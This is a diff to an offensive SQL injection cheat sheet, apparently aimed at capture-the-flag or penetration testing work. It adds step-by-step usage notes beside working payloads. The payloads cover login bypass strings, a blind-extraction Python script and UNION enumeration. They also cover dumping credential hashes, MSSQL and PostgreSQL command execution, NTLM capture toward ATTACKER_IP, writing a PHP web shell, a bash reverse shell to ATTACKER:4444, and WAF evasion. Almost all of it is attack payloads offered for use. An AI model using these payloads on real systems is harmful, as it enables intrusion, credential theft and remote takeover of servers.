@@ -17,6 +17,7 @@
 ' OR 1=1-- -  → auth bypass with comment
 1' AND SLEEP(5)-- -   → time-based confirmation
 ```
+> Test these one at a time to find injectable inputs. A single `'` that causes an error confirms injection. `SLEEP(5)` confirms blind injection — if the response takes 5 seconds longer, the input is executed as SQL.
 
 > **Always test for SQL errors first.** Verbose errors leak query structure (column names, line of failure). Use `--parse-errors` in sqlmap or just submit `'` and read the response.
 
@@ -55,6 +56,7 @@ admin')-- -             # close paren, comment rest
 admin"-- -
 admin" OR "1"="1
 ```
+> Enter these in the username field of a login form. `admin'-- -` comments out the rest of the query so the password check never runs. Try the parentheses variants if the basic ones fail — the closing `)` fixes a syntax error caused by extra brackets in the original query.
 
 ---
 
@@ -122,6 +124,7 @@ When the page only shows TRUE/FALSE (different content, different status code).
 -- ASCII binary search saves requests (8 vs 95)
 ' AND ASCII(SUBSTRING((SELECT user()),POS,1)) > MID-- -
 ```
+> Boolean blind SQLi extracts data one bit at a time. Confirm injection with `1=1` (true) vs `1=2` (false). Then use `ASCII()` with binary search — testing whether a character's ASCII value is greater than the midpoint — to find each character in ~7 requests instead of 95.
 
 **Python helper for boolean blind:**
 ```python
@@ -138,6 +141,7 @@ for pos in range(1, 50):
             result += c; print(result); break
     else: break
 ```
+> Automates character-by-character extraction for boolean blind SQLi. Replace `URL`, the parameter name, the TRUE-condition string (`'WELCOME'`), and the SQL subquery with your target's values. The outer loop iterates positions; the inner loop tries each character.
 
 ---
 
@@ -182,6 +186,7 @@ UNION SELECT 1,username,password,4 FROM dbname.tablename-- -
 -- All tables + columns in one query
 UNION SELECT 1,GROUP_CONCAT(TABLE_SCHEMA,0x2e,TABLE_NAME,0x3a,COLUMN_NAME SEPARATOR 0x0a),3,4 FROM information_schema.columns-- -
 ```
+> Standard MySQL enumeration sequence via UNION injection. Replace the column count (1,2,3,4) with the actual count you discovered. Replace `dbname` and `tablename` with values from the previous queries. The final `GROUP_CONCAT` query dumps every table and column name in one shot.
 
 ---
 
@@ -222,6 +227,7 @@ When the injection point is in MSSQL and stacking is allowed:
 -- Linked server enumeration:
 '; SELECT srvname FROM master..sysservers-- -
 ```
+> Run these three statements in order to enable and execute OS commands via MSSQL. Each `;` starts a new stacked query. Replace `ATTACKER_IP` with your machine's IP when using `xp_dirtree` to capture an NTLM hash via Responder.
 
 ---
 
@@ -235,6 +241,7 @@ When the injection point is in MSSQL and stacking is allowed:
 -- Read file:
 '; CREATE TABLE r(t text); COPY r FROM '/etc/passwd';-- -
 ```
+> PostgreSQL RCE via `COPY FROM PROGRAM` — requires superuser privileges. The first query creates a table and runs a system command, storing output in it. The second query reads the result. Replace `'id'` with any OS command. Use stacked query syntax (`;`) to chain statements.
 
 ---
 
@@ -256,6 +263,7 @@ UNION SELECT 1,HEX(LOAD_FILE('/binary/file')),3,4-- -                   # binary
 UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
 UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
 ```
+> MySQL file read and write via UNION injection. First check `secure_file_priv` — an empty value means writes are allowed anywhere. Use `LOAD_FILE` to read config files and find the webroot. Then write a PHP web shell to the webroot path. Replace column positions and paths with your target's values.
 
 ---
 
@@ -269,6 +277,7 @@ curl "http://TARGET/shell.php?0=cat+/flag.txt"
 # Upgrade to reverse shell:
 curl "http://TARGET/shell.php?0=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
 ```
+> Executes OS commands through the uploaded PHP web shell. The parameter `0=` passes the command. URL-encode spaces as `+`. Replace `TARGET` with the target URL, `ATTACKER` with your IP, and `4444` with your listener port. Run `nc -lvnp 4444` before triggering the reverse shell.
 
 ---
 
@@ -304,6 +313,7 @@ CHAR(97,100,109,105,110) → 'admin'
 -- HTTP Parameter Pollution
 ?id=1&id=2 UNION SELECT 1,2,3-- -    -- ASP/ASP.NET concatenates
 ```
+> WAF (Web Application Firewall) bypass techniques. Try case variation first — it's the easiest and works against basic rule-based filters. Use comment insertion or encoded whitespace when spaces are blocked. Use hex literals or `CHAR()` when quotes are stripped. Apply these progressively until a payload gets through.
 
 ---
 
@@ -334,6 +344,7 @@ DESCRIBE tablename;
 SELECT * FROM table WHERE col LIKE 'val%';
 SELECT user, host, authentication_string FROM mysql.user;   -- creds for cracking
 ```
+> MySQL command-line reference. `-u` sets the username, `-p` the password (no space between flag and value), `-h` sets the remote host, `-P` sets the port, `--skip-ssl` avoids certificate errors. The last `SELECT` dumps credential hashes from the `mysql.user` table for offline cracking.
 
 ---
 
